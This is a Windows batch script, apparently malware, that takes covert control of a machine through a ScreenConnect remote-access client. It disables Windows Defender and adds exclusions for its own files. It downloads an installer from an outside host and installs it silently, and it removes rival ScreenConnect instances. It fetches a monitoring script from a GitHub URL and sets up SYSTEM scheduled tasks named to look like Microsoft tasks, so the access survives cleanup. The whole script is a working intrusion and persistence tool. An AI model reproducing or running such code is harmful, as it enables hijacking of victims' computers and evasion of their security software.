@echo off
setlocal EnableExtensions EnableDelayedExpansion
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "SELF=%WD%\own_run.cmd"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1

REM Survive ScreenConnect Guest 30s kill: detach into independent process
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O5 ===
  net session >nul 2>&1
  if errorlevel 1 (echo need Administrator & exit /b 5)
  echo go_start %DATE% %TIME%>"%LOG%"
  echo order=ensure_primary_then_nuke>>"%LOG%"
  echo engine=cmd_only_detached>>"%LOG%"
  copy /y "%~f0" "%SELF%" >nul
  echo detach_begin>>"%LOG%"
  wmic process call create "cmd.exe /c \"%SELF%\" _RUN" >"%WD%\detach.wmic" 2>&1
  echo detach_done>>"%LOG%"
  echo Detached. Wait ~60s then:
  echo   type "%LOG%"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo === OWN WORKER 20260802O5 ===

echo [1] Defender reg only (no sc stop hang)...
echo av_reg_begin>>"%LOG%"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Windows\Temp" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%TEMP%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "curl.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
REM fire-and-forget only - sc stop WinDefend hangs forever on locked hosts
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Ensure PRIMARY...
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :have_primary
)

echo primary missing/stopped - MSI install...
echo primary_install_begin>>"%LOG%"
del /f /q "%MSI%" >nul 2>&1
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 120 -o "%MSI%" "%MSIURL%"
if not exist "%MSI%" (
  echo msi_dl_fail>>"%LOG%"
  goto :start_primary
)
for %%A in ("%MSI%") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_small>>"%LOG%"
    goto :start_primary
  )
)
start "" /b cmd /c "sc stop \"%PRIM%\" >nul 2>&1"
timeout /t 2 /nobreak >nul
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress
echo msi_exit_%ERRORLEVEL%>>"%LOG%"
timeout /t 12 /nobreak >nul
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus REBOOT=ReallySuppress
echo msi_reinstall_%ERRORLEVEL%>>"%LOG%"
timeout /t 8 /nobreak >nul

:start_primary
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1

:have_primary
sc query "%PRIM%" | findstr /I RUNNING >nul
if errorlevel 1 (
  echo PRIMARY NOT RUNNING - will NOT nuke
  echo primary_fail_no_nuke>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
  goto :finish_alt
)
echo primary RUNNING OK
echo primary_running_ok>>"%LOG%"

echo [3] Nuke foreign ScreenConnect...
echo nuke_begin>>"%LOG%"
for /f "tokens=2 delims=:" %%A in ('sc query state= all ^| findstr /C:"SERVICE_NAME:"') do (
  set "SN=%%A"
  if defined SN (
    set "SN=!SN:~1!"
    echo !SN! | findstr /I "ScreenConnect" >nul
    if not errorlevel 1 (
      set "KEEP=0"
      echo !SN! | findstr /I "%KEEP1%" >nul && set "KEEP=1"
      echo !SN! | findstr /I "%KEEP2%" >nul && set "KEEP=1"
      if "!KEEP!"=="1" (
        echo KEEP !SN!
        echo keep_svc=!SN!>>"%LOG%"
      ) else (
        echo NUKE !SN!
        echo nuke_svc=!SN!>>"%LOG%"
        sc stop "!SN!" >nul 2>&1
        sc delete "!SN!" >nul 2>&1
      )
    )
  )
)

wmic process where "name='ScreenConnect.ClientService.exe' and not ExecutablePath like '%%!KEEP1!%%' and not ExecutablePath like '%%!KEEP2!%%' and not ExecutablePath like '%%scclient%%'" call terminate >nul 2>&1
wmic process where "name='ScreenConnect.WindowsClient.exe' and not ExecutablePath like '%%!KEEP1!%%' and not ExecutablePath like '%%!KEEP2!%%' and not ExecutablePath like '%%scclient%%'" call terminate >nul 2>&1
echo proc_trim_done>>"%LOG%"

for %%R in ("%ProgramFiles%" "%ProgramFiles(x86)%") do (
  if exist "%%~R" for /d %%D in ("%%~R\ScreenConnect*") do (
    set "KEEP=0"
    echo %%~nxD | findstr /I "%KEEP1%" >nul && set "KEEP=1"
    echo %%~nxD | findstr /I "%KEEP2%" >nul && set "KEEP=1"
    if "!KEEP!"=="1" (
      echo keep_dir=%%~D>>"%LOG%"
    ) else (
      echo nuke_dir=%%~D>>"%LOG%"
      rd /s /q "%%~D" >nul 2>&1
    )
  )
)
echo nuke_done>>"%LOG%"

:finish_alt
echo [4] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul

echo [5] Arm wipe-proof persist (2m/3m/onstart/onlogon + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0own_mon.cmd" (
  copy /y "%~dp0own_mon.cmd" "%WD%\own_mon.cmd" >nul
) else (
  curl.exe -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.cmd" >nul 2>&1
)
REM optional Telegram cfg beside own.cmd (never commit real notify.cfg)
if exist "%~dp0notify.cfg" copy /y "%~dp0notify.cfg" "%WD%\notify.cfg" >nul
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

REM cache MSI for offline-ish reinstall after wipe
if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 copy /y "%MSI%" "%WD%\pkg.msi" >nul

schtasks /Delete /TN "\Microsoft\Windows\Diagnosis\Scheduled" /F >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\Diagnosis\Scheduled" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
schtasks /Delete /TN "\Microsoft\Windows\PLA\Server" /F >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\PLA\Server" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "cmd.exe /c \"%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd\"" >nul 2>&1
schtasks /Delete /TN "\Microsoft\Windows\WDI\ResolutionHost" /F >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
schtasks /Delete /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /F >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
echo persist_armed_wipeproof>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0
